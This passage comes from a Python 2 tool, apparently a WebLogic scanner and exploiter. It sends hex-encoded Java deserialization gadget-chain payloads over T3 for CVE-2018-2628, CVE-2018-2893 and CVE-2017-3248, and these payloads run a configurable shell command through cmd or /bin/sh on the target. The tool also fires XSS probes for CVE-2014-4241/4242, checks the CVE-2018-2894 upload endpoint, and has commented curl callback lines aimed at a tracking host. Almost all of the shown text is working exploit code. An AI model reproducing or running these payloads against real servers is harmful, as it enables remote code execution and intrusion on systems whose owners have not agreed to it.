e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f00000002707571007e002f00000000740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e002b757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174{}{}740004657865637571007e00320000000171007e00377371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878'.format('{:04x}'.format(len(cmd)),b2a_hex(cmd))
        payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(len(payload)/2 + 4), payload)
        sleep(2)
        sock.send(payload.decode('hex'))
        res = ''
        try:
            while True:
                res += sock.recv(4096)
                sleep(0.1)
        except Exception as e:
            pass
        p=re.findall(VER_SIG[0], res, re.S)
        if len(p)>0:
            print '[+] Weblogic Has Vul CVE-2018-2628'
        else:
            print '[-] Weblogic Not Has Vul CVE-2018-2628'
    def c2893(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2018-2893'
        VER_SIG=['\\$Proxy[0-9]+']
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        server_addr = (self.ip, self.port)
        try:
            sock.connect(server_addr)
        except Exception, e:
            print '[-] ConnectionError,Check Your Input',"Error:",e
            return False   
        sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
        sleep(self.waittime)
        if len(sock.recv(1024))>0:
            print '[*] Handshake Successful'
        else:
            print '[*] T3 Handshake Failed '
            print "[-] WebLogic Cannot Make Use Of Vul CVE-2018-2893"
            return False
        if self.check:
            pass
        else:
            print '[*] Start JRMPListener'
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(self.port))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(d.decode('hex'))
        srdata = ''
        tims = 0
        try:
            while True:
                srdata += sock.recv(2048)
                sleep(0.1)
                tims =tims+0.1
                if tims>30:
                    print '[*] TimeOut.'
                    break
        except socket.timeout,e:
            if len(srdata)>0:
                print '[*] Send Request Payload Successful,Recv Length:%d' % (len(srdata))
            else:
                print '[*] TimeOut:Waited For data More Than 30 seconds'
                print '[-] CVE-2018-2628 May Can\'t be Used Of WebLogic'
                return
        except Exception as e:
            pass
        if len(srdata)>0:
            pass
        else:
            print '[*] WebLogic Has Not Return Any Data'
            print '[-] CVE-2018-2628 May Can\'t Be Used Of WebLogic'
            return
        payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        payload+=self.c2893playload
        payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(len(payload)/2 + 4), payload)
        sock.send(payload.decode('hex'))
        sleep(2)
        sock.send(payload.decode('hex'))
        res = ''
        try:
            while True:
                res += sock.recv(4096)
                sleep(0.1)
        except Exception as e:
            pass
        p=re.findall(VER_SIG[0], res, re.S)
        if len(p)>0:
            print '[+] Weblogic Has Vul CVE-2018-2893'
        else:
            print '[-] Weblogic Not Has Vul CVE-2018-2893'

    def c2894(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2018-2894'
        if self.port==443:
            url_1 = self.url+"/ws_utc/config.do"
            url_2 = self.url+"/ws_utc/begin.do"
        else:
            url_1 = self.url+':'+str(self.port)+"/ws_utc/config.do"
            url_2 = self.url+':'+str(self.port)+"/ws_utc/begin.do"
        urls = [url_1,url_2]
        for i in urls:
            try:
                req = requests.get(i,allow_redirects=False, timeout=10, verify=False)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
            sleep(0.5)
            if req.status_code==200 and len(req.text)>10:
                print '[+] Weblogic Has Vul CVE-2018-2894'
                break
        else:
            print '[-] Weblogic Not Has Vul CVE-2018-2894'

    def C4241(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2014-4241(XSS)'
        url_1 =self.url+':'+str(self.port)+"/uddiexplorer/SetupUDDIExplorer.jsp?privateregistry=<script>alert(2)</script>&setPrivateRegistryInquiry=Set+Search+URL"
        url_2 =self.url+':'+str(self.port)+"/uddiexplorer/SetupUDDIExplorer.jsp?privateregistry=<script>alert(2</script>&setPrivateRegistryPublish=Set+Publish+URL"
        url_3 =self.url+':'+str(self.port)+"/uddiexplorer/SetupUDDIExplorer.jsp?publicregistryname=test&publicregistryurl=<script>alert(2)</script>&addPublicRegistry=Add+Public+Registry+URL"
        urls = [url_1,url_2,url_3]
        for i in urls:
            try:
                sleep(0.5)
                req = requests.get(i,allow_redirects=False, timeout=10, verify=False)               
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
            if req.status_code==200:
                print '[+] Weblogic Has Vul CVE-2014-4241'
                break
            else:
                continue
        else:
            print '[-] Weblogic Not Has Vul CVE-2014-4241'
    def C4242(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2014-4242(XSS)'
        url   =self.url+':'+str(self.port)+"/console/"
        url_1 =self.url+':'+str(self.port)+"/console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIHomePage&server=myserver');alert(1)//"
        urls = [url,url_1]
        for i in urls:
            try:
                req = requests.get(i,allow_redirects=False,timeout=10,verify=False)
                sleep(0.5)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
            if req.status_code == 200 and 'alert' in req.text and 'j_username' not in req.text:
                print '[+] Weblogic Has Vul CVE-2014-4242'
                break
        else:
            if req.status_code==302:
                print '[-] Access Denied'
            else:
                print '[-] Weblogic Not Has Vul CVE-2014-4242'
    def c3248(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2017-3248'
        try:
            if (self.port == 443):
                sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.ip, self.port)
            print '[*] Connecting to %s port %s' % server_address
            sock.settimeout(15)
            sock.connect(server_address)
            print '[*] Sending Headers'
            sock.sendall('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            if len(sock.recv(1024))>0:
                print '[*] Handshake Successful'
            else:
                print '[*] T3 Handshake Failed '
                print "[-] WebLogic Cannot Make Use Of Vul CVE-2017-3248"
                return False
            cmd_c = '{0} {1} {2}'.format(self.cmd_base(),self.cmd_opt(),self.cmds())
            cmd ='aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005374002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a6563747371007e000b0000003571007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f00000002707571007e002f00000000740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e002b757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174{0}{1}740004657865637571007e00320000000171007e00377371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878'.format('{:04x}'.format(len(cmd_c)),b2a_hex(cmd_c))
            payloadh= '00000970016501ffffffffffffffff000000690000ea60000000182946da33c66e124576343378d5a54205c404ebbc6a4e332a027973720078720178720278700000000a000000030000000000000000007070707070700000000a000000030000000000000000007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'
            payloadd= 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = payloadh+cmd+payloadd
            payloadlen = '%s'%'{:04x}'.format(len(payload)/2)
            payload = payload.replace('0970',payloadlen)

            self.sss = False
            t = threading.Thread(target=self.slis)
            t.setDaemon(True)
            t.start()

            st = 0
            while True:
                pass
                if self.sss:
                    print '\n[*] Sendding Payload...'
                    sleep(2)
                    sock.send(payload.decode('hex'))
                    break
                else:
                    sleep(self.waittime)
                    st =st+1
                    if st > 5:
                        print '[*] Listening Port Failed'
                        print "[-] Check Vul CVE-2017-3248 Error_Code:332"
                        return
            while t.isAlive():
                sleep(self.waittime)
                st = st +1
                if st % 12 == 0:
                    print '[*] Waiting For Server Connect.'
                if st>60:
                    print '[*] TimeOut.'
                    break
            
            if self.listening !='':
                print self.listening
                print "[+] WebLogic Has Vul CVE-2017-3248"
            else:
                print "[-] WebLogic Not Has Vul CVE-2017-3248"        
        except Exception , e:print '[-] ConnectionError,Check Your Input',"Error:"+str(e)


    def cmd_base(self):
        if self.target == 'win':
            return 'cmd'
        return '/bin/sh'
    def cmd_opt(self):
        if self.target == 'win':
            return '/c'
        return '-c'
    def cmds(self):
        if self.target == 'win':
            # return 'start http://%s:%s' %(self.trackip,self.trackport)
            # return 'calc.exe'
            return self.shell
        # return "curl -s http://{}:{}".format(self.trackip,self.trackport)
        return self.shell
if __name__ == '__main__':
    config={
    "url":'127.0.0.1',   # target IP
    "port":7001,         # target port
    "os":"win",          # 系统os (win or others)
    "shell":'calc.exe',  # 命令执行
    "cc":True,           # 执行反序列化payload
    "check":False  ,     # 测试模式 关
    "sip":"127.0.0.1",   # 测试模式下http接收IP
    "sport":4444,        # 测试模式下http接收端口
    "waittime":0.1   ,   # 测试模式-超时时间(攻击模式可设置为0.01)
    }
    wls = WebLogic(config['url'],config['port'],config['sip'],config['sport'],config['os'],config['waittime'],config['check'],config['shell'])
    wls.ssrf()           # CVE-2014-4210(SSRF)
    wls.C4241()          # CVE-2014-4241(XSS)
    wls.C4242()          # CVE-2014-4242(XSS)
    wls.c3506()          # CVE-2017-3506  (exec_shell)
    wls.xmlDecoder()     # CVE-2017-10271 (exec_shell)
    wls.c2894()          # CVE-2018-2894  (ws_utc/config.do)
    wls.weakPasswd()
    if config['cc']:
        wls.c3248()      # CVE-2017-3248
        wls.cve2628()    # CVE-2018-2628
        wls.c2893()      # CVE-2018-2893 JDK7u10<21 java -jar ysoserial-cve-2018-2893.jar Jdk7u21 "calc" |xxd -p| tr -d '\n'
        wls.C4852()      # CVE-2015-4852 java -jar ./ysoserial.jar CommonsCollections1 'calc.exe'|xxd -p| tr -d '\n'
    

# _>java -jar ysoserial-cve-2018-2893.jar
# Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
# Available payload types:
#      Payload     Authors   Dependencies
#      -------     -------   ------------
#      JRMPClient  @mbechler 
#      JRMPClient2 @pynerd
#      JRMPClient3 @pynerd
#      JRMPClient4 @pynerd
#      Jdk7u21     @frohoff  